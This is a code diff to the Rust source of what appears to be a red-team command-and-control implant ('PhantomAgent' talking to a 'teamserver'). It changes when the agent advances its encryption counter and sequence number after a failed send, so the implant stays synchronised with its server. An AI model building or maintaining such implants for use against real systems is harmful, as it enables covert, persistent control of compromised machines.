@@ -64,10 +64,16 @@ impl PhantomAgent {
             &[],
         )?;
         let response = self.transport.send(&packet).await;
-        // Always advance — the teamserver consumes seq/ctr before sending the response.
-        // If the response is lost, not advancing here desynchs every subsequent packet.
-        self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandCheckin), 0);
-        self.callback_seq += 1;
+        // Advance unless the server never received the packet (connection-refused).
+        // • Connection-refused (ECONNREFUSED): OS rejected before TCP connect; server
+        //   CTR/seq is unchanged.  Advancing here permanently desynchs (red-cell-c2-1fhji).
+        // • All other failures (TCP-reset, timeout, lost response): the server already
+        //   consumed the packet and advanced its CTR; we MUST advance to stay in sync
+        //   (red-cell-c2-n4kr4).
+        if !matches!(&response, Err(PhantomError::ConnectionRefused(_))) {
+            self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandCheckin), 0);
+            self.callback_seq += 1;
+        }
         let _response = response?;
 
         // Fetch queued tasks with a separate COMMAND_GET_JOB request.
@@ -91,11 +97,12 @@ impl PhantomAgent {
                     &payload,
                 )?;
                 let send_result = self.send_packet(packet).await;
-                // Always advance — the teamserver consumes seq/ctr before responding.
-                // Conditional advance causes permanent desync when the server received
-                // the packet but the TCP response was lost (red-cell-c2-n4kr4).
-                self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
-                self.callback_seq += 1;
+                // Advance unless connection-refused (server never processed the packet).
+                // See COMMAND_CHECKIN advance above for the full rationale.
+                if !matches!(&send_result, Err(PhantomError::ConnectionRefused(_))) {
+                    self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
+                    self.callback_seq += 1;
+                }
                 match send_result {
                     Ok(()) => {
                         if matches!(callback, PendingCallback::Exit { .. }) {
@@ -226,11 +233,12 @@ impl PhantomAgent {
                 &payload,
             )?;
             let send_result = self.send_packet(packet).await;
-            // Always advance — the teamserver consumes seq/ctr before responding.
-            // Conditional advance causes permanent desync when the server received
-            // the packet but the TCP response was lost (red-cell-c2-n4kr4).
-            self.ctr_offset += callback_ctr_blocks(callbacks[idx].command_id(), payload.len());
-            self.callback_seq += 1;
+            // Advance unless connection-refused (server never processed the packet).
+            // See COMMAND_CHECKIN advance in checkin() for the full rationale.
+            if !matches!(&send_result, Err(PhantomError::ConnectionRefused(_))) {
+                self.ctr_offset += callback_ctr_blocks(callbacks[idx].command_id(), payload.len());
+                self.callback_seq += 1;
+            }
             if let Err(e) = send_result {
                 warn!(error = %e, "failed to flush callback; re-queuing remaining");
                 self.state.requeue_callbacks_front(callbacks[idx..].to_vec());
